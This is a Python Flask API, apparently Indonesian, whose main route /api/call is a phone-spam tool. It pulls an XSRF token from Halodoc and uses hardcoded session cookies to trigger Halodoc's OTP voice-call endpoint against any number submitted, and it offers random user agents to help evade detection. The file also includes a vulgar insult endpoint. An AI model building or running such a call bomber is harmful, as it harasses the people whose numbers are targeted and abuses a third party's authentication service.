from flask import Flask,request,make_response,jsonify,redirect,url_for,render_template
from flask_restful import Resource,Api
import jwt,datetime,requests,json
from functools import wraps
from fake_useragent import UserAgent

app=Flask(__name__)
api=Api(app)
app.config["SECRET_KEY"] = "inirahasianegara"

@app.route('/')
def index():
    # Redirect to home/index.html
    #return redirect(url_for('static', filename='home/index.html'))
	return render_template('index.html')

class SpamCall(Resource):
	def post(self):
		nomor=request.form.get("nomor")
		if not nomor:
			return ({
				"message": "nomor tidak valid (8xxxx)",
				"response code": 404
			})
		xsrf = requests.get("https://magneto.api.halodoc.com/api/v1/users/status").cookies.get_dict()
		headhaldoc = {"referer": "https://www.halodoc.com","content-type": "application/json","x-xsrf-token": xsrf['XSRF-TOKEN']}
		paylodhaldoc = {"phone_number": "+62"+nomor,"channel": "voice"}
		cokihaldoc = {"cookie": '_gcl_au=1.1.935637007.1686465186; _gid=GA1.2.1888372629.1686465187; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"9ade8176-03c1-dd87-f8d7-c0c3f60f861a","c":1686465187381,"l":1686465187381}; XSRF-TOKEN='+xsrf['XSRF-TOKEN']+'; afUserId=31b1ff72-9c27-4492-a787-7a895c0d422e-p; AF_SYNC=1686465191318; _ga_02NBJNEKVH=GS1.1.1686465187.1.1.1686465223.0.0.0; amp_394863=WECZG4ZhC4dZKUWVGE4Ogh...1h2kii76k.1h2kiiai8.3.0.3; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"c13c57ed-4fbf-80d3-7b17-19eb5a8fcedc","e":1686467027367,"c":1686465187365,"l":1686465227367}; _ga=GA1.2.1084460534.1686465187'}
		response = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests",headers=headhaldoc,data=json.dumps(paylodhaldoc),cookies=cokihaldoc).json()
		if 'otp_id' in response:
			return ({
				"response":"success",
				"message":f"Berhasil Mengirim Call Ke {nomor}",
				"creator":"AmmarBN"
			})
		else:
			return ({
				"response":"Failed",
				"message":f"Gagal Mengirim Call ke {nomor}",
				"creator":"AmmarBN"
			})

class HomePage(Resource):
    def get(self):
        return jsonify({"mssg":"Halo Admin, Rest Flask Berhasil dibuat ©Dusttale"})

class Kontol(Resource):
    def get(self):
        return jsonify({"mssg":"Muka Lu Kaya Kontol:V"})

class RandomUa(Resource):
    def get(self):
        useragent=UserAgent()
        ua=useragent.random
        return ({
            "user-agent": ua,
            "response code": 200,
            "creator": "Ammar-Excuted"
        })


api.add_resource(HomePage, "/apikey", methods=["GET"])
api.add_resource(RandomUa, "/api/user-agent", methods=["GET"])
api.add_resource(Kontol, "/testing", methods=["GET"])
api.add_resource(SpamCall, "/api/call", methods=["POST"])
if __name__ == "__main__":
    app.run(debug=True)
